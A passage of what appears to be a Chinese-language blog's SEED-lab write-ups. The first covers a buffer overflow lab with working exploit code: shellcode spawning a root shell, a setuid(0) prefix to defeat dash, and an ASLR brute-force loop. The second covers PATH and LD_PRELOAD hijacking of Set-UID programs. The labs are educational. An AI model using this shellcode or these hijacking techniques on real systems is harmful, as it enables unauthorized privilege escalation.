%ebx                   */</span><br>    <span class="hljs-string">&quot;\x89\xe1&quot;</span>             <span class="hljs-comment">/* movl    %esp,%ecx              */</span><br>    <span class="hljs-string">&quot;\x99&quot;</span>                 <span class="hljs-comment">/* cdq                            */</span><br>    <span class="hljs-string">&quot;\xb0\x0b&quot;</span>             <span class="hljs-comment">/* movb    $0x0b,%al              */</span><br>    <span class="hljs-string">&quot;\xcd\x80&quot;</span>             <span class="hljs-comment">/* int     $0x80                  */</span><br>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br><br>    <span class="hljs-comment">/* Initialize buffer with 0x90 (NOP instruction) */</span><br>    <span class="hljs-built_in">memset</span>(&amp;buffer, <span class="hljs-number">0x90</span>, <span class="hljs-number">517</span>);<br><br>    <span class="hljs-comment">/* You need to fill the buffer with appropriate contents here */</span> <br>    <span class="hljs-built_in">memcpy</span>(buffer+<span class="hljs-number">36</span>,<span class="hljs-string">&quot;\x7c\xeb\xff\xbf&quot;</span>,<span class="hljs-number">4</span>);<span class="hljs-comment">//0xbf ff eb 7c</span><br>    <span class="hljs-built_in">strcpy</span>(buffer+<span class="hljs-number">100</span>,shellcode);<br>    <span class="hljs-comment">/* Save the contents to the file &quot;badfile&quot; */</span><br>    badfile = fopen(<span class="hljs-string">&quot;./badfile&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    fwrite(buffer, <span class="hljs-number">517</span>, <span class="hljs-number">1</span>, badfile);<br>    fclose(badfile);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>构造buffer，将原本的返回地址覆盖为0xbf ff eb 7c，注意这里是小端序，因此使用<code>memcpy(buffer+36,&quot;\x7c\xeb\xff\xbf&quot;,4);</code></li><li>0xbf ff eb 7c是buffer+100的地址，因此shellcode需要从buffer+100起始</li></ul><p>stack.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Vunlerable program: stack.c */</span><br><span class="hljs-comment">/* You can get this program from the lab&#x27;s website */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-comment">/* Changing this size will change the layout of the stack.</span><br><span class="hljs-comment"> * Instructors can change this value each year, so students</span><br><span class="hljs-comment"> * won&#x27;t be able to use the solutions from the past.</span><br><span class="hljs-comment"> * Suggested value: between 0 and 400  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> BUF_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE 24</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bof</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buffer[BUF_SIZE];<br><br>    <span class="hljs-comment">/* The following statement has a buffer overflow problem */</span><br>    <span class="hljs-built_in">strcpy</span>(buffer, str);       <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> str[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br><br>     <span class="hljs-comment">/* Change the size of the dummy array to randomize the parameters</span><br><span class="hljs-comment">       for this lab. Need to use the array at least once */</span><br>    <span class="hljs-keyword">char</span> dummy[BUF_SIZE];  <span class="hljs-built_in">memset</span>(dummy, <span class="hljs-number">0</span>, BUF_SIZE);<br><br>    badfile = fopen(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    fread(str, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">517</span>, badfile);<br>    bof(str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Returned Properly\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>bof函数<code>strcpy(buffer, str);</code>  语句存在缓冲区溢出漏洞</li><li>str存储badfile中的内容，使用exploit生成恶意内容</li></ul><h1 id="Task-3-Defeating-dash’s-Countermeasure"><a href="#Task-3-Defeating-dash’s-Countermeasure" class="headerlink" title="Task 3: Defeating dash’s Countermeasure"></a>Task 3: Defeating dash’s Countermeasure</h1><p>dash有一个防御机制，当发现euid和真实id不一样的时候，就会放弃特权</p><p>因此攻击setuid程序的时候，一般我们会手动将/bin/sh指向别的shell。比如zsh，而这个任务要求我们在dash的情况下得到root shell</p><p>思路：</p><ul><li>在Task2的shellcode最开头加上setuid(0)对应的二进制代码</li></ul><p>首先将sh指向dash</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo ln -sf <span class="hljs-regexp">/bin/</span>dash <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">`<span class="hljs-string">&quot;\x31\xc0&quot;</span> <span class="hljs-comment">/* Line 1: xorl %eax,%eax */</span><br><span class="hljs-string">&quot;\x31\xdb&quot;</span> <span class="hljs-comment">/* Line 2: xorl %ebx,%ebx */</span><br><span class="hljs-string">&quot;\xb0\xd5&quot;</span> <span class="hljs-comment">/* Line 3: movb $0xd5,%al */</span><br><span class="hljs-string">&quot;\xcd\x80&quot;</span> <span class="hljs-comment">/* Line 4: int $0x80 */</span><br></code></pre></td></tr></table></figure><p>将上面的代码加到shellcode之后，重新编译exploit.c，运行exploit，可以得到#，但是如果不加上面代码，则只能得到$，与预计相符合</p><h1 id="Task-4-Defeating-Address-Randomization"><a href="#Task-4-Defeating-Address-Randomization" class="headerlink" title="Task 4: Defeating Address Randomization"></a>Task 4: Defeating Address Randomization</h1><p>ASLR：</p><ul><li>在32位 Linux 机器上，堆栈只有19位的熵</li><li>这意味着堆栈基地址可以有219 = 524,288种可能性</li></ul><p>打开地址随机化：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /sbin/sysctl -w kernel.randomize_va_space=2<br></code></pre></td></tr></table></figure><p>使用以下 shell 脚本在无限循环中运行易受攻击的程序。如果攻击成功，脚本将停止; 否则，脚本将继续运行</p><ul><li>本质上这个脚本其实就是不断的运行stack，核心代码只有./stack这一句</li><li>别的代码都是计时用的</li><li>命名为attach.sh，然后chmod +x 赋予执行权限，./attack运行脚本</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>SECONDS=0<br><br>value=0<br>while [ 1 ]<br>do<br>    value=$(( $value + 1 ))<br>    duration=$SECONDS<br>    min=$(($duration / 60))<br>    sec=$(($duration % 60))<br>    echo &quot;$min minutes and $sec seconds elapsed.&quot;<br>    echo &quot;The program has been running $value times so far.&quot;<br>    ./stack<br>done<br></code></pre></td></tr></table></figure><p>最红花了一分多钟就遍历得到了root shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span> minutes and <span class="hljs-number">31</span> seconds elapsed.<br><span class="hljs-attribute">The</span> program has been running <span class="hljs-number">45135</span> times so far.<br><span class="hljs-comment">#     </span><br></code></pre></td></tr></table></figure><h1 id="Task-5-Turn-on-the-StackGuard-Protection"><a href="#Task-5-Turn-on-the-StackGuard-Protection" class="headerlink" title="Task 5: Turn on the StackGuard Protection"></a>Task 5: Turn on the StackGuard Protection</h1><p>Stack Guard 使用 Canaries 检验堆栈是否被修改或者覆盖</p><p>假设打开Stack Guard，会abort错误</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">*** </span>stack smashing detected <span class="hljs-strong">***</span>: ./test terminated<br>Aborted<br></code></pre></td></tr></table></figure><h1 id="Task-6-Turn-on-the-Non-executable-Stack-Protection"><a href="#Task-6-Turn-on-the-Non-executable-Stack-Protection" class="headerlink" title="Task 6: Turn on the Non-executable Stack Protection"></a>Task 6: Turn on the Non-executable Stack Protection</h1><p>打开堆栈不可执行保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -o stack -fno-stack-protector -z noexecstack stack.c<br></code></pre></td></tr></table></figure><p>出现段错误</p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Environment Variable and Set-UID Program Lab</title>
    <link href="/p/c51248f4/"/>
    <url>/p/c51248f4/</url>
    
    <content type="html"><![CDATA[<h1 id="Task-1-Manipulating-Environment-Variables"><a href="#Task-1-Manipulating-Environment-Variables" class="headerlink" title="Task 1: Manipulating Environment Variables"></a>Task 1: Manipulating Environment Variables</h1><p>环境变量是个以=号连接的键值对，是隐式传入程序中的</p><ul><li>printenv和env命令可以在shell中打印出当前的环境变量<ul><li>使用grep获取某个特定值</li></ul></li><li>export命令和unset命令分别可以设置和去除环境变量</li></ul><h1 id="Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process"><a href="#Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process" class="headerlink" title="Task 2: Passing Environment Variables from Parent Process to Child Process"></a>Task 2: Passing Environment Variables from Parent Process to Child Process</h1><p>使用gcc命令生成可执行文件，将父子进程printenv的结果分别重定向到两个不同的文件a和b，并用diff a b命令进行比对，发现没有区别</p><p>这说明通过fork的方式产生的父子进程的环境变量是相同的</p><h1 id="Task-3-Environment-Variables-and-execve"><a href="#Task-3-Environment-Variables-and-execve" class="headerlink" title="Task 3: Environment Variables and execve()"></a>Task 3: Environment Variables and execve()</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">2</span>];<br><br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/usr/bin/env&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><br>  execve(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>, argv, <span class="hljs-literal">NULL</span>);  <br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行上面的程序没有任何输出，说明该进程没有继承任何的环境变量</p><p>将<code>execve(&quot;/usr/bin/env&quot;, argv, NULL);  </code>语句修改为<code>execve(&quot;/usr/bin/env&quot;, argv, environ);  </code>发现可以打印出环境变量</p><p>因此execve最后一个参数如果不指定的话，是默认不传递任何环境变量的</p><h1 id="Task-4-Environment-Variables-and-system"><a href="#Task-4-Environment-Variables-and-system" class="headerlink" title="Task 4: Environment Variables and system()"></a>Task 4: Environment Variables and system()</h1><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The  <span class="hljs-keyword">system</span>()  library  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uses</span> <span class="hljs-title">fork</span>(<span class="hljs-title">2</span>) <span class="hljs-title">to</span> <span class="hljs-title">create</span> <span class="hljs-title">a</span> <span class="hljs-title">child</span> <span class="hljs-title">process</span></span><br>   that executes <span class="hljs-keyword">the</span> <span class="hljs-built_in">shell</span> <span class="hljs-keyword">command</span> <span class="hljs-title">specified</span> <span class="hljs-title">in</span> <span class="hljs-title">command</span> <span class="hljs-title">using</span> <span class="hljs-title">execl</span>(<span class="hljs-title">3</span>)  <span class="hljs-title">as</span><br>   follows:<br><br>       execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-keyword">command</span>, (<span class="hljs-title">char</span> *) <span class="hljs-title">NULL</span>);<br><br>   <span class="hljs-keyword">system</span>() returns <span class="hljs-keyword">after</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">command</span> <span class="hljs-title">has</span> <span class="hljs-title">been</span> <span class="hljs-title">completed</span>.<br><br>   During  execution  <span class="hljs-keyword">of</span>  <span class="hljs-keyword">the</span> <span class="hljs-keyword">command</span>, <span class="hljs-title">SIGCHLD</span> <span class="hljs-title">will</span> <span class="hljs-title">be</span> <span class="hljs-title">blocked</span>, <span class="hljs-title">and</span> <span class="hljs-title">SIGINT</span><br>   <span class="hljs-keyword">and</span> SIGQUIT will be  ignored,  <span class="hljs-keyword">in</span>  <span class="hljs-keyword">the</span>  <span class="hljs-built_in">process</span>  that  calls  <span class="hljs-keyword">system</span>().<br>   (These  signals  will be handled according <span class="hljs-built_in">to</span> their defaults inside <span class="hljs-keyword">the</span><br>   child <span class="hljs-built_in">process</span> that executes command.)<br><br>   If <span class="hljs-keyword">command</span> <span class="hljs-title">is</span> <span class="hljs-title">NULL</span>, <span class="hljs-title">then</span> <span class="hljs-title">system</span>() <span class="hljs-title">returns</span> <span class="hljs-title">a</span> <span class="hljs-title">status</span> <span class="hljs-title">indicating</span> <span class="hljs-title">whether</span> <span class="hljs-title">a</span><br>   <span class="hljs-built_in">shell</span> is available <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">system</span>.<br><br></code></pre></td></tr></table></figure><h1 id="Task-5-Environment-Variable-and-Set-UID-Programs"><a href="#Task-5-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 5: Environment Variable and Set-UID Programs"></a>Task 5: Environment Variable and Set-UID Programs</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>sudo chown root a.out <br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>sudo chmod <span class="hljs-number">4755</span> a.out <br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>ll a.out <br>-rwsr-xr-x <span class="hljs-number">1</span> root seed <span class="hljs-number">16760</span> Oct <span class="hljs-number">31</span> 04<span class="hljs-symbol">:</span>03 a.out<br><br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>export PATH=<span class="hljs-string">&quot;/usr/bin&quot;</span><br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>export LD_LIBRARY_PATH=<span class="hljs-string">&quot;wdnmd&quot;</span><br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>export wdnmd=<span class="hljs-string">&quot;nmsl&quot;</span><br></code></pre></td></tr></table></figure><ul><li><p>PATH:可执行文件的搜索路径</p></li><li><p>LD_LIBRARY_PATH:用于告诉动态链接加载器在哪里寻找特定应用程序的共享库</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (environ[i] != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, environ[i]);<br>        i++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的程序打印出环境变量的值，发现PATH和wdnmd被更改，LD_LIBRARY_PATH没有被更改</p><h1 id="Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><a href="#Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 6: The PATH Environment Variable and Set-UID Programs"></a>Task 6: The PATH Environment Variable and Set-UID Programs</h1><p>使用<code>export PATH=$PWD:$PATH</code>命令将/home/seed加到path环境变量的前面</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译一下上面的程序，当它执行的时候会fork出进程然后执行ls程序</p><p>将/bin/ls复制到当前目录，修改为suid程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">[10/31/22]seed@VM:~/lab/Labsetup$ sudo chown root ls<br>[10/31/22]seed@VM:~/lab/Labsetup$ sudo chmod 4755 ls<br>[10/31/22]seed@VM:~/lab/Labsetup$ ll ls<br>-rwsr-xr-x 1 root seed 16696 Oct 31 04:22 ls<br></code></pre></td></tr></table></figure><p>由于/bin/sh 实际上是一个指向/bin/dash 的符号链接，dash有一个防御对策，可以防止自己在 Set-UID 进程中执行：如果检测到它是在 Set-UID 进程中执行的，它会立即将有效用户 ID 更改为进程的实际用户 ID，实际上就是放弃了特权。由于我们的受害者程序是一个 Set-UID 程序，所以/bin/dash 中的对策可以防止我们的攻击</p><p>为了正常进行攻击，修改sh指向：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo ln -sf <span class="hljs-regexp">/bin/</span>zsh <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p>此时你在shell中输入ls那么会执行当前目录下的ls程序</p><h1 id="Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 7: The LD PRELOAD Environment Variable and Set-UID Programs"></a>Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</h1><blockquote><p><code>LD_</code>开头的环境变量会影响动态链接器/加载器的行为</p><p>fPIC：Generate position-independent code (PIC)，意味着生成的机器代码不依赖于位于特定的地址</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">$ gcc -fPIC -g -c mylib.c<br>$ gcc -shared -o libmylib.so<span class="hljs-number">.1</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> mylib.o -lc<br>$ <span class="hljs-keyword">export</span> LD_PRELOAD=./libmylib.so<span class="hljs-number">.1</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">void</span> sleep (<span class="hljs-keyword">int</span> s)<br>&#123;<br><span class="hljs-comment">/* If this is invoked by a privileged program,</span><br><span class="hljs-comment">you can do damages here! */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I am not sleeping!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>myproc.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> ** environ;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (environ[i] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i],<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)!= <span class="hljs-literal">NULL</span>)<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, environ[i]);<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span> i++;<br>&#125;<br>sleep(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Make-myprog-a-regular-program-and-run-it-as-a-normal-user"><a href="#Make-myprog-a-regular-program-and-run-it-as-a-normal-user" class="headerlink" title="Make myprog a regular program, and run it as a normal user."></a>Make myprog a regular program, and run it as a normal user.</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ myprog <br><span class="hljs-attribute">LD_PRELOAD</span>=./libmylib.so.1.0.1<br>I am <span class="hljs-keyword">not</span> sleeping!<br></code></pre></td></tr></table></figure><h2 id="Make-myprog-a-Set-UID-root-program-and-run-it-as-a-normal-user"><a href="#Make-myprog-a-Set-UID-root-program-and-run-it-as-a-normal-user" class="headerlink" title="Make myprog a Set-UID root program, and run it as a normal user."></a>Make myprog a Set-UID root program, and run it as a normal user.</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">[10/31/22]seed@VM:~/lab/Labsetup$ sudo chown root myprog <br>[10/31/22]seed@VM:~/lab/Labsetup$ sudo chmod 4755 myprog<br>[10/31/22]seed@VM:~/lab/Labsetup$ ll myprog<br>-rwsr-xr-x 1 root seed 16856 Oct 31 12:06 myprog<br><br>[10/31/22]seed@VM:~/lab/Labsetup$ ./myprog <br>[10/31/22]seed@VM:~/lab/Labsetup$ <br></code></pre></td></tr></table></figure><p>这里什么都没有打印</p><h2 id="Make-myprog-a-Set-UID-root-program-export-the-LD-PRELOAD-environment-variable-again-in-the-root-account-and-run-it"><a href="#Make-myprog-a-Set-UID-root-program-export-the-LD-PRELOAD-environment-variable-again-in-the-root-account-and-run-it" class="headerlink" title="Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root account and run it"></a>Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root account and run it</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@VM</span><span class="hljs-symbol">:/home/seed/lab/Labsetup</span><span class="hljs-comment"># export LD_PRELOAD=&quot;/home/seed/lab/Labsetup/libmylib.so.1.0.1&quot;</span><br>root<span class="hljs-variable">@VM</span><span class="hljs-symbol">:/home/seed/lab/Labsetup</span><span class="hljs-comment"># ./myprog</span><br>LD_PRELOAD=<span class="hljs-regexp">/home/seed</span><span class="hljs-regexp">/lab/</span>Labsetup/libmylib.so.<span class="hljs-number">1.0</span>.<span class="hljs-number">1</span><br>I am <span class="hljs-keyword">not</span> sleeping!<br></code></pre></td></tr></table></figure><p>在切换为root用户后，打印出了LD_PRELOAD环境变量，并且调用了我们设计的共享库的sleep函数</p><h2 id="Make-myprog-a-Set-UID-user1-program-i-e-the-owner-is-user1-which-is-another-user-account-export-the-LD-PRELOAD-environment-variable-again-in-a-different-user’s-account-not-root-user-and-run-it"><a href="#Make-myprog-a-Set-UID-user1-program-i-e-the-owner-is-user1-which-is-another-user-account-export-the-LD-PRELOAD-environment-variable-again-in-a-different-user’s-account-not-root-user-and-run-it" class="headerlink" title="Make myprog a Set-UID user1 program (i.e., the owner is user1, which is another user account),export the LD PRELOAD environment variable again in a different user’s account (not-root user) and run it."></a>Make myprog a Set-UID user1 program (i.e., the owner is user1, which is another user account),export the LD PRELOAD environment variable again in a different user’s account (not-root user) and run it.</h2><p>和Make myprog a regular program, and run it as a normal user.结果相同</p><h1 id="Task-8-Invoking-External-Programs-Using-system-versus-execve"><a href="#Task-8-Invoking-External-Programs-Using-system-versus-execve" class="headerlink" title="Task 8: 